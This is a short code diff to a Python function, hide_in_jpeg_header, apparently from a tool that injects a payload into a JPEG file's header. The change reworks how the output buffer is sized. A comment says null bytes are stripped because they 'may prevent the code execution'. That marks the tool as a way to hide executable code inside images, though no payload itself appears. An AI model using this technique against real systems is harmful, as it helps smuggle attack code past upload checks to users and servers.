@@ -173,11 +173,14 @@ def hide_in_jpeg_header(payload, jpeg_file):
         payload_bytes = pd.read()
 
     previous_header_len = img_bytes[4]*256 + img_bytes[5] # In JPEG header bytes 4 and 5 indicate the size of the header
-    injected_img = bytearray(len(img_bytes) + len(payload_bytes) + 2) # Reserve space for the additional payload + 2 for the line skip (0D 0A)
+    
     new_header_len = previous_header_len + len(payload_bytes) + 2
-
     if new_header_len < 256: # This is to avoid that the size part of the new header contains a 0x00 
         new_header_len = 257 # 257 -> 0x01 0x01
+
+
+    injected_img = bytearray(len(img_bytes) - previous_header_len + new_header_len + len(payload_bytes) + 2) # Reserve space for the additional payload + 2 for the line skip (0D 0A)
+    
 
     for i in range(previous_header_len): # Copy the information from the old header but remove any 0x00 since they may prevent the code execution
         if img_bytes[i] == 0x00: 
